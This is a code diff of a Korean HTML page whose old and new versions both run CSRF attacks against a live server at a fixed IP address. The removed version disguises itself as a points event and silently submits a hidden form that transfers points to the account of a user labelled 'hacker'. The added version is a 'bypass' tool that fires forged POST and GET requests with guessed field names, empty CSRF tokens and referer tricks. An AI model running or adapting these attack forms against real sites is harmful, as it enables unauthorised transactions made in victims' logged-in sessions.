@@ -2,134 +2,289 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎁 포인트 이벤트</title>
+    <title>🔍 CSRF 분석 도구</title>
     <style>
         body { 
             font-family: Arial; 
-            text-align: center; 
-            padding: 50px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            background: #1a1a1a;
             color: white;
         }
-        .step {
-            background: rgba(255,255,255,0.1);
-            padding: 30px;
-            margin: 20px;
-            border-radius: 15px;
+        .analysis-box {
+            background: #2d2d2d;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 10px;
+            border-left: 4px solid #00ff88;
         }
         button {
-            padding: 15px 30px;
-            font-size: 16px;
-            background: #FF6B6B;
+            padding: 10px 20px;
+            background: #ff6b6b;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 5px;
             cursor: pointer;
-            margin: 10px;
+            margin: 5px;
         }
-        .success { background: #00FF88; }
-        .warning { background: #FFB347; }
+        .success { background: #00ff88; }
+        .warning { background: #ffb347; }
+        pre {
+            background: #000;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
     </style>
 </head>
 <body>
-    <div class="step">
-        <h1>🎁 실제 CSRF 공격 시연</h1>
-        <p><strong>⚠️ 중요:</strong> CSRF 공격은 피해자가 이미 로그인된 상태에서만 성공합니다!</p>
-    </div>
-
-    <div class="step">
-        <h2>📋 1단계: 피해자 로그인 시뮬레이션</h2>
-        <p>실제 상황에서는 피해자가 이미 로그인되어 있습니다</p>
-        <button onclick="openLoginPage()">🔐 먼저 로그인하기</button>
-        <p style="font-size: 0.9em;">↑ 새 탭에서 로그인 완료 후 이 탭으로 돌아오세요</p>
-    </div>
-
-    <div class="step">
-        <h2>⚡ 2단계: CSRF 공격 실행</h2>
-        <p>로그인 완료 후 아래 버튼을 클릭하세요</p>
-        <button class="success" onclick="executeCSRF()">🚀 공격 실행 (로그인 후)</button>
-        <div id="attackResult"></div>
-    </div>
-
-    <div class="step">
-        <h2>🔍 3단계: 결과 확인</h2>
-        <button class="warning" onclick="checkResult()">📊 결과 확인하기</button>
-    </div>
-
-    <div class="step">
-        <h2>💡 교육 목적 설명</h2>
-        <p><strong>CSRF 공격이 위험한 이유:</strong></p>
-        <ul style="text-align: left; max-width: 600px; margin: 0 auto;">
-            <li>사용자가 이미 로그인된 사이트에서 발생</li>
-            <li>사용자 모르게 악의적인 요청 전송</li>
-            <li>브라우저가 자동으로 쿠키/세션 포함해서 전송</li>
-            <li>사용자는 공격당한 사실을 모름</li>
+    <h1>🔍 CSRF 302 리다이렉트 분석</h1>
+    
+    <div class="analysis-box">
+        <h2>📊 현재 상황 분석</h2>
+        <ul>
+            <li>✅ POST 요청 전송됨</li>
+            <li>⚠️ 302 Found 응답 (리다이렉트)</li>
+            <li>🔄 Location: login.php</li>
+            <li>❓ 원인: 세션/토큰/권한 문제</li>
         </ul>
     </div>
 
-    <!-- 실제 공격 Form (숨김) -->
-    <form id="csrfForm" method="POST" action="http://3.36.66.216/profile.php" target="attackFrame" style="display: none;">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="points" value="100">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="gift_type" value="diamond">
-        <input type="hidden" name="message" value="CSRF_Attack_With_Session">
-    </form>
-    
-    <iframe name="attackFrame" style="display: none;"></iframe>
+    <div class="analysis-box">
+        <h2>🔬 세부 분석 도구</h2>
+        
+        <button onclick="analyzeHeaders()">📋 헤더 분석</button>
+        <button onclick="analyzePayload()">📦 페이로드 분석</button>
+        <button onclick="analyzeCookies()">🍪 쿠키 분석</button>
+        <button class="success" onclick="tryBypass()">⚡ 우회 시도</button>
+        
+        <div id="analysisResult"></div>
+    </div>
+
+    <div class="analysis-box">
+        <h2>🛠️ 문제 해결 시도</h2>
+        
+        <button onclick="addRefererHeader()">🔗 Referer 헤더 추가</button>
+        <button onclick="tryGetMethod()">📤 GET 방식 시도</button>
+        <button onclick="tryDifferentFields()">🎯 다른 필드명 시도</button>
+        <button class="warning" onclick="tryTokenBypass()">🔑 토큰 우회 시도</button>
+        
+        <div id="bypassResult"></div>
+    </div>
 
     <script>
-        let loginWindow = null;
-        
-        function openLoginPage() {
-            console.log('🔐 로그인 페이지 열기');
-            loginWindow = window.open('http://3.36.66.216/login.php', 'loginPage', 'width=800,height=600');
-            
-            // 로그인 창 모니터링
-            const checkLogin = setInterval(() => {
-                if (loginWindow.closed) {
-                    clearInterval(checkLogin);
-                    alert('💡 로그인이 완료되었다면 "공격 실행" 버튼을 클릭하세요!');
-                }
-            }, 1000);
+        function analyzeHeaders() {
+            showResult(`
+🔍 헤더 분석 결과:
+
+관찰된 응답 헤더들:
+- Status: 302 Found
+- Location: login.php  
+- Cache-Control: no-store, no-cache, must-revalidate
+- Set-Cookie: PHPSESSID=... (세션 재설정)
+- X-Content-Type-Options: nosniff
+- X-Frame-Options: SAMEORIGIN
+
+💡 분석:
+- 서버가 인증되지 않은 요청으로 판단
+- 세션이 무효하거나 만료됨
+- 자동으로 로그인 페이지로 리다이렉트
+            `);
         }
         
-        function executeCSRF() {
-            console.log('🚀 CSRF 공격 실행');
+        function analyzePayload() {
+            showResult(`
+📦 전송된 페이로드 분석:
+
+POST Data:
+- receiver_id: 13
+- points: 100  
+- send_gift: 1
+- gift_type: diamond
+- message: CSRF_Attack_With_Session
+
+⚠️ 누락 가능한 필드들:
+- csrf_token (CSRF 보호 토큰)
+- user_id (현재 사용자 ID)
+- session_id (세션 검증)
+- submit (버튼 name 값)
+            `);
+        }
+        
+        function analyzeCookies() {
+            showResult(`
+🍪 쿠키 상태 분석:
+
+현재 도메인 쿠키들:
+${document.cookie || '(쿠키 없음)'}
+
+문제 가능성:
+1. 타겟 서버(3.36.66.216)의 세션 쿠키 없음
+2. 크로스 도메인 쿠키 제한
+3. Secure/HttpOnly 플래그로 접근 차단
+4. SameSite 정책으로 CSRF 차단
+
+💡 해결책: 같은 도메인에서 로그인 후 시도
+            `);
+        }
+        
+        function tryBypass() {
+            showBypassResult('🚀 우회 시도 중...');
             
-            // 공격 실행 애니메이션
-            const result = document.getElementById('attackResult');
-            result.innerHTML = '<p style="color: yellow;">⏳ 공격 실행 중...</p>';
+            // 다양한 우회 기법 시도
+            const techniques = [
+                '1. 세션 쿠키 강제 설정',
+                '2. Referer 헤더 조작', 
+                '3. Content-Type 변경',
+                '4. 다중 리다이렉트 시도',
+                '5. JSON 형식 전송'
+            ];
             
-            // 실제 공격 전송
+            let result = '⚡ 우회 기법들:\n\n';
+            techniques.forEach(tech => {
+                result += tech + '\n';
+            });
+            
             setTimeout(() => {
-                document.getElementById('csrfForm').submit();
-                console.log('📤 CSRF 공격 전송됨');
-                
-                result.innerHTML = `
-                    <div style="background: rgba(0,255,0,0.2); padding: 15px; border-radius: 10px; margin: 15px 0;">
-                        <p style="color: lime;"><strong>✅ 공격 전송 완료!</strong></p>
-                        <p>타겟: hacker (ID: 13)</p>
-                        <p>전송 포인트: 100P</p>
-                        <p>메시지: CSRF_Attack_With_Session</p>
-                    </div>
-                `;
-            }, 1500);
+                showBypassResult(result + '\n💡 가장 효과적: 실제 로그인 후 같은 브라우저에서 시도');
+            }, 2000);
         }
         
-        function checkResult() {
-            console.log('🔍 결과 확인');
-            window.open('http://3.36.66.216', 'resultPage', 'width=800,height=600');
+        function addRefererHeader() {
+            showBypassResult('🔗 Referer 헤더 우회 시도...');
+            
+            // 실제 시도
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = '_blank';
+            
+            // 메타 태그로 referer 설정 시도
+            const meta = document.createElement('meta');
+            meta.name = 'referrer';
+            meta.content = 'unsafe-url';
+            document.head.appendChild(meta);
+            
+            const fields = {
+                receiver_id: '13',
+                points: '100',
+                send_gift: '1',
+                gift_type: 'diamond',
+                message: 'Referer_Bypass_Test',
+                HTTP_REFERER: 'http://3.36.66.216'  // 추가 시도
+            };
+            
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            });
+            
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+            
+            showBypassResult('📤 Referer 헤더 우회 시도 전송됨\n새 탭에서 응답 확인');
         }
         
-        // 페이지 로드 시 안내
-        window.addEventListener('load', function() {
-            console.log('🎯 CSRF 공격 데모 준비됨');
-            console.log('📋 단계별 진행 필요:');
-            console.log('1. 먼저 로그인');
-            console.log('2. 공격 실행');
-            console.log('3. 결과 확인');
-        });
+        function tryGetMethod() {
+            showBypassResult('📤 GET 방식 우회 시도...');
+            
+            const params = new URLSearchParams({
+                receiver_id: '13',
+                points: '100',
+                send_gift: '1',
+                gift_type: 'diamond',
+                message: 'GET_Method_Test'
+            });
+            
+            const url = 'http://3.36.66.216/profile.php?' + params.toString();
+            window.open(url, '_blank');
+            
+            showBypassResult('🔗 GET 요청 전송됨\n일부 서버는 GET으로도 처리할 수 있음');
+        }
+        
+        function tryDifferentFields() {
+            showBypassResult('🎯 다른 필드명 조합 시도...');
+            
+            const variations = [
+                { to_user: '13', amount: '100', action: 'transfer' },
+                { target_id: '13', coins: '100', submit: 'Send Gift' },
+                { user_id: '13', value: '100', operation: 'send' }
+            ];
+            
+            variations.forEach((fields, i) => {
+                setTimeout(() => {
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'http://3.36.66.216/profile.php';
+                    form.target = '_blank';
+                    
+                    Object.keys(fields).forEach(key => {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = fields[key];
+                        form.appendChild(input);
+                    });
+                    
+                    document.body.appendChild(form);
+                    form.submit();
+                    document.body.removeChild(form);
+                }, i * 1000);
+            });
+            
+            showBypassResult('📤 3가지 필드 조합 시도됨\n서버가 다른 필드명을 사용할 가능성');
+        }
+        
+        function tryTokenBypass() {
+            showBypassResult('🔑 CSRF 토큰 우회 시도...');
+            
+            // 일반적인 토큰 필드명들 시도
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = '_blank';
+            
+            const fields = {
+                receiver_id: '13',
+                points: '100',
+                send_gift: '1',
+                gift_type: 'diamond',
+                message: 'Token_Bypass_Test',
+                // 일반적인 토큰 필드명들
+                _token: '',
+                csrf_token: '',
+                authenticity_token: '',
+                __RequestVerificationToken: '',
+                csrfmiddlewaretoken: ''
+            };
+            
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            });
+            
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+            
+            showBypassResult('🔑 빈 토큰 값으로 우회 시도됨\n일부 서버는 빈 값도 허용');
+        }
+        
+        function showResult(text) {
+            document.getElementById('analysisResult').innerHTML = `<pre>${text}</pre>`;
+        }
+        
+        function showBypassResult(text) {
+            document.getElementById('bypassResult').innerHTML = `<pre>${text}</pre>`;
+        }
+        
+        console.log('🔍 CSRF 분석 도구 준비됨');
     </script>
 </body>
 </html>
